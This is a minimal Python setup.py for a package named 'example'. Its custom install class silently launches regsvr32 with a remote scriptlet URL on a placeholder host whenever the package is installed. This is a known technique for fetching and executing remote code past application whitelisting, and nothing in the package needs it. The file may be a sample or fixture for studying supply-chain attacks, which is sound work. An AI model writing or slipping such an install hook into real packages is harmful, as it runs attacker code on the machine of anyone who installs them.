from setuptools import setup
from setuptools.command.install import install
import subprocess
class CustomInstall(install):
    def run(self):
        subprocess.Popen('regsvr32.exe /s /i:https://example.invalid/stage scrobj.dll /n /u')
        install.run(self)
setup(name='example', cmdclass={'install': CustomInstall})
